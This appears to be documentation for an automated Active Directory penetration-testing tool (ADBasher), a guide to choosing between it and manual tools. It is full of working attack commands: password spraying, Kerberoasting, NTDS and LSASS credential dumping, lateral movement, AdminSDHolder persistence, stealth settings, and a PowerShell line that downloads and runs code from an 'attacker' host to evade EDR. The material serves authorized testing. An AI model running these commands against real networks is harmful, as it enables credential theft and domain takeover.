# ADBasher vs Manual Workflows

Decision guide for choosing between automated ADBasher execution and manual tool usage during Active Directory penetration tests.

---

## Quick Decision Matrix

| Scenario                              | Use ADBasher              | Use Manual Tools        |
| ------------------------------------- | ------------------------- | ----------------------- |
| **Full penetration test** (5-10 days) | ✅ Primary approach       | For specific tasks only |
| **Red team exercise** (30-90 days)    | ✅ With `--opsec stealth` | For targeted operations |
| **Compliance audit**                  | ✅ Automated coverage     | For validation          |
| **Bug bounty / specific target**      | ❌ Too broad              | ✅ Surgical approach    |
| **Training / lab environment**        | ✅ `--opsec aggressive`   | ✅ For learning         |
| **Production emergency**              | ❌ Too automated          | ✅ Controlled execution |

---

## When to Use ADBasher (Fully Automated)

### ✅ Ideal Scenarios

#### 1. **Time-Boxed Penetration Tests**

**Scenario**: Client engagement with 5-10 day time limit  
**Why ADBasher**: Maximizes coverage within limited timeframe

```bash
# Day 1: Launch unattended automation
./adbasher.py --target client.local --opsec standard

# Days 2-4: Analyze results, manual exploitation
# Analyze BloodHound data
# Review session database
sqlite3 ~/.adbasher/sessions/<ID>/session.db

# Day 5: Report generation (already automated)
```

**Benefits**:

- Completes recon, credential attacks, enumeration while you sleep
- No missed attack vectors due to time constraints
- Consistent methodology across all engagements

---

#### 2. **Large / Complex Environments**

**Scenario**: Fortune 500 enterprise with 10,000+ users, 50+ domain controllers  
**Why ADBasher**: Automation scales where manual doesn't

```bash
# Target multiple domains simultaneously
./adbasher.py --target \
  corporate.example.com \
  subsidiary1.local \
  subsidiary2.local \
  10.0.0.0/16 \
  192.168.0.0/16
```

**Benefits**:

- Handles massive user lists for password spraying
- Discovers all domain trusts automatically
- Enumerates thousands of systems without manual tracking

---

#### 3. **Red Team Long-Duration Operations**

**Scenario**: 90-day red team testing client's detection capabilities  
**Why ADBasher**: Stealth mode avoids triggering alerts prematurely

```bash
# Ultra-stealthy automated execution
./adbasher.py --target client.local --opsec stealth

# ADBasher stealth mode characteristics:
# - 30-120 second jitter between actions
# - Single-threaded execution
# - 1-2 password attempts per cycle (weeks apart)
# - Business hours only operation (optional config)
```

**Benefits**:

- Maintains persistence without manual intervention
- Consistent OPSEC throughout engagement
- Automated logging for timeline reconstruction

---

#### 4. **Compliance / Security Assessments**

**Scenario**: Annual security audit, checkbox compliance (PCI-DSS, SOC 2)  
**Why ADBasher**: Comprehensive, repeatable, documented

```bash
./adbasher.py --target internal.corp.local

# Automated report generation meets compliance requirements
# - HTML report for executives
# - Markdown report for detailed findings
# - JSON logs for SIEM integration
```

**Benefits**:

- Consistent methodology year-over-year
- Automated professional reporting
- Database export for compliance documentation

---

## When to Use Manual Tools

### ✅ Ideal Scenarios

#### 1. **Surgical / Targeted Operations**

**Scenario**: Need to test specific vulnerability or attack path  
**Why Manual**: Too specific for broad automation

```bash
# ADBasher would scan everything
# Manual: Target specific account/system

# Test if specific service account is Kerberoastable
GetUserSPNs.py corp.local/user:pass -request -target-domain-ip svc_backup

# Attempt specific delegation abuse
getST.py -spn cifs/server.corp.local \
  -impersonate Administrator \
  corp.local/delegated_account
```

**When to Choose**:

- Exploiting specific BloodHound attack path
- Testing fix for previously discovered vulnerability
- Avoiding detection during sensitive operations

---

#### 2. **Learning / Training Environments**

**Scenario**: Personal lab, certification study (OSCP, CRTP)  
**Why Manual**: Understanding underlying techniques

```bash
# Instead of:
./adbasher.py --target lab.local

# Manually execute each technique:
GetNPUsers.py lab.local/ -dc-ip 10.0.0.1 -request        # AS-REP roasting
GetUserSPNs.py lab.local/user:pass -request              # Kerberoasting
secretsdump.py lab.local/admin:pass@DC01                  # NTDS dumping
bloodhound-python -d lab.local -u user -p pass -c All    # BloodHound
```

**Benefits**:

- Deeper understanding of attack mechanics
- Troubleshooting skills development
- Command syntax memorization for exams

---

#### 3. **Evading Specific Defenses**

**Scenario**: Client has EDR/AV that flags known tools  
**Why Manual**: Need custom obfuscation or alternative tools

```bash
# ADBasher calls standard Impacket tools
# Manual: Use alternative implementations

# Instead of GetUserSPNs.py (potentially flagged)
# Use PowerView from memory
powershell -ep bypass
IEX (New-Object Net.WebClient).DownloadString('http://attacker/PowerView.ps1')
Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname
```

**When to Choose**:

- Known tool signatures are blocked
- Need to test specific evasion techniques
- Custom payload/implant development

---

#### 4. **Emergency / Incident Response**

**Scenario**: Active breach, need to verify compromise  
**Why Manual**: Controlled, deliberate execution

```bash
# Don't blindly automate in production emergency

# Verify specific compromise indicator
crackmapexec smb DC01 -u suspected_compromised -p password

# Check for golden ticket (krbtgt password changes)
secretsdump.py domain/admin:pass@DC01 | grep krbtgt

# Verify specific persistence mechanism
Get-DomainPolicy | Select-Object -ExpandProperty KerbLifeTime
```

**When to Choose**:

- Production systems, risk of disruption
- Need precise control over each action
- Validating specific IOCs

---

## Hybrid Approach (Recommended)

The most effective methodology combines both approaches:

### Phase 1-2: Automated Discovery (ADBasher)

```bash
# Let ADBasher handle time-consuming enumeration
./adbasher.py --target corp.local --opsec standard

# Review automated findings
sqlite3 ~/.adbasher/sessions/<ID>/session.db
```

### Phase 3: Manual Analysis & Exploitation

```bash
# Upload BloodHound data for attack path analysis
# ~/.adbasher/sessions/<ID>/bloodhound_data/*.zip

# Manually execute identified attack path
# E.g., if BloodHound shows: User → WriteDacl → AdminSDHolder

# Step 1: Add ACL (manual precision)
Add-DomainObjectAcl -TargetIdentity "AdminSDHolder" \
  -PrincipalIdentity "compromised_user" -Rights All

# Step 2: Trigger SDProp (manual timing control)
Invoke-SDPropagator
```

### Phase 4: Automated Post-Exploitation (ADBasher)

```bash
# Once admin creds obtained, let ADBasher handle:
# - NTDS dumping across all DCs
# - Lateral movement to all systems
# - Persistence mechanism deployment

# ADBasher automatically escalates when admin creds discovered
```

---

## ADBasher Individual Modules

Sometimes you want ADBasher's automation for **one specific task**, not the full workflow:

### ✅ When to Use Individual Modules

#### Scenario: Want ADBasher's lockout-protected password spraying only

```bash
# Don't run full automation
# Execute single module

python3 "3 nopass/automated/password_spray.py" \
  --session-dir ~/.adbasher/sessions/manual_$(date +%s) \
  --domain corp.local \
  --dc-ip 10.0.0.1 \
  --username-file users.txt \
  --passwords Password123 Welcome1 Summer2024

# Benefits:
# - ADBasher's intelligent throttling
# - Database storage of results
# - Lockout protection (30s delays)
# - But only password spraying, nothing else
```

#### Scenario: Want ADBasher's automated BloodHound collection only

```bash
python3 "6 validcreds/automated/bloodhound_collect.py" \
  --session-dir ~/.adbasher/sessions/manual_$(date +%s) \
  --domain corp.local \
  --dc-ip 10.0.0.1 \
  --username jdoe \
  --password Password123

# Benefits:
# - Automated data collection
# - Error handling and retries
# - Organized output directory
# - But skips all other phases
```

---

## Detailed Comparison Tables

### Reconnaissance Phase

| Task                  | ADBasher Command                     | Manual Command                                                        | ADBasher Advantage                         | Manual Advantage                |
| --------------------- | ------------------------------------ | --------------------------------------------------------------------- | ------------------------------------------ | ------------------------------- |
| Domain discovery      | `./adbasher.py --target 10.0.0.0/24` | `nslookup -type=SRV _ldap._tcp.dc._msdcs.example.local`               | Automatic, discovers all domains in subnet | Faster for single known domain  |
| User enumeration      | Automatic (Phase 1, LDAP anonymous)  | `ldapsearch -x -h DC01 -b "DC=example,DC=local" "(objectClass=user)"` | Handles auth failures gracefully           | Fine-grained LDAP queries       |
| SMB null session enum | Automatic (Phase 1)                  | `enum4linux-ng -A 10.0.0.1`                                           | Tests entire subnet                        | Detailed output for single host |
| Service enumeration   | Automatic (nmap wrapper)             | `nmap -sV -sC 10.0.0.1`                                               | Targeted AD ports only                     | Full port scan flexibility      |

### Credential Attacks

| Task              | ADBasher Command              | Manual Command                                                      | ADBasher Advantage                       | Manual Advantage                     |
| ----------------- | ----------------------------- | ------------------------------------------------------------------- | ---------------------------------------- | ------------------------------------ |
| AS-REP roasting   | Automatic (Phase 2)           | `GetNPUsers.py example.local/ -dc-ip DC01 -request`                 | Automatic user list from Phase 1         | Faster for known vulnerable accounts |
| Password spraying | Automatic (lockout-protected) | `crackmapexec smb DC01 -u users.txt -p passwords.txt`               | Built-in throttling, zero lockouts       | Immediate feedback, faster testing   |
| Kerberoasting     | Automatic when creds found    | `GetUserSPNs.py example.local/user:pass -request`                   | Credential cascading (auto-triggers)     | Selective SPN targeting              |
| DCSync            | Automatic check               | `secretsdump.py -just-dc-user krbtgt example.local/admin:pass@DC01` | Detects rights, doesn't auto-dump (safe) | Immediate NTDS extraction            |

### Post-Exploitation

| Task             | ADBasher Command           | Manual Command                                              | ADBasher Advantage                 | Manual Advantage           |
| ---------------- | -------------------------- | ----------------------------------------------------------- | ---------------------------------- | -------------------------- |
| BloodHound       | Automatic when valid creds | `bloodhound-python -d example.local -u user -p pass -c All` | Automatic execution + storage      | Custom collection methods  |
| NTDS dumping     | Auto when admin detected   | `secretsdump.py example.local/admin:pass@DC01`              | Tests all DCs automatically        | Surgical DC targeting      |
| Lateral movement | Auto multi-method          | `wmiexec.py example.local/admin:pass@10.0.0.50`             | Tries WMI, PSExec, SMBExec, AtExec | Method-specific control    |
| LSASS dumping    | Auto on admin systems      | `lsassy -d example.local -u admin -p pass -t 10.0.0.0/24`   | Memory-only, no disk writes        | Process-specific targeting |

---

## Decision Flowchart

```
START: Active Directory Penetration Test
│
├─➤ Time-boxed engagement (< 10 days)?
│   YES ➤ Use ADBasher (full automation)
│   NO  ➤ Continue
│
├─➤ Large environment (1000+ users)?
│   YES ➤ Use ADBasher (scalability)
│   NO  ➤ Continue
│
├─➤ Need comprehensive coverage?
│   YES ➤ Use ADBasher (all attack vectors)
│   NO  ➤ Continue
│
├─➤ Testing specific vulnerability / attack path?
│   YES ➤ Use Manual Tools (precision)
│   NO  ➤ Continue
│
├─➤ Learning / certification training?
│   YES ➤ Use Manual Tools (understanding)
│   NO  ➤ Continue
│
├─➤ Production emergency (active breach)?
│   YES ➤ Use Manual Tools (control)
│   NO  ➤ Continue
│
└─➤ DEFAULT ➤ Use Hybrid Approach
    1. ADBasher for enumeration/credential attacks
    2. Manual for analysis and exploitation
    3. ADBasher for post-exploitation automation
```

---

## Real-World Engagement Examples

### Example 1: Standard Penetration Test

**Client**: Mid-size financial services company (2,000 users)  
**Duration**: 7 days  
**Approach**: ADBasher-primary with manual analysis

```bash
# Day 1: Launch automation
./adbasher.py --target client.com --opsec standard

# Day 2-3: Analyze BloodHound, identify attack paths
# Manual exploitation of specific paths
# Upload bloodhound data from ADBasher session

# Day 4-5: ADBasher for lateral movement to identified targets
# Manual persistence deployment (client-specific requirements)

# Day 6: Report review, retest fixes
# Day 7: Final report delivery (ADBasher auto-generated + manual edits)
```

---

### Example 2: Red Team Exercise

**Client**: Large enterprise (50,000 users)  
**Duration**: 90 days  
**Approach**: Stealth automation with surgical manual operations

```bash
# Week 1-2: Ultra-stealthy reconnaissance
./adbasher.py --target enterprise.com --opsec stealth
# Runs continuously with 30-120s delays

# Week 3-6: Manual social engineering (out of ADBasher scope)
# Phishing campaign for initial access

# Week 7-10: ADBasher credential attacks on compromised subnet
./adbasher.py --target 10.50.0.0/16 --opsec stealth

# Week 11-12: Manual exploitation of high-value targets
# Surgical attacks on executive systems (manual precision)
```

---

### Example 3: Internal Security Assessment

**Client**: Healthcare provider (HIPAA compliance)  
**Duration**: 3 days  
**Approach**: Rapid automated assessment

```bash
# Day 1 morning: Kick off automation
./adbasher.py --target hospital.local

# Day 1 afternoon: Review findings while automation runs
sqlite3 ~/.adbasher/sessions/<ID>/session.db

# Day 2: Manual validation of critical findings
# Verify NTDS dumping was possible (compliance violation)
# Test identified lateral movement paths

# Day 3: Report generation (automated) + remediation briefing
```

---

## Summary Recommendations

| **Use ADBasher When...**           | **Use Manual Tools When...**      |
| ---------------------------------- | --------------------------------- |
| ✅ Time-limited engagement         | ❌ Learning/training              |
| ✅ Large environment               | ❌ Specific target/bug bounty     |
| ✅ Need comprehensive coverage     | ❌ Testing specific vulnerability |
| ✅ Repeatable methodology required | ❌ Custom evasion needed          |
| ✅ Red team stealth operations     | ❌ Production emergency           |
| ✅ Compliance documentation        | ❌ Deep understanding needed      |

**Best Practice**: **Start** with ADBasher for broad coverage, **transition** to manual tools for precision exploitation, **return** to ADBasher for scaled post-exploitation.

---

## Additional Resources

- **[ADBasher Command Reference](ADBASHER_COMMAND_REFERENCE.md)** - Full command documentation
- **[Main Documentation](AD_PENETRATION_TESTING_GUIDE.md)** - Complete penetration testing guide
- **[Case Studies](sections/08_case_studies.md)** - Real-world examples showing hybrid approaches
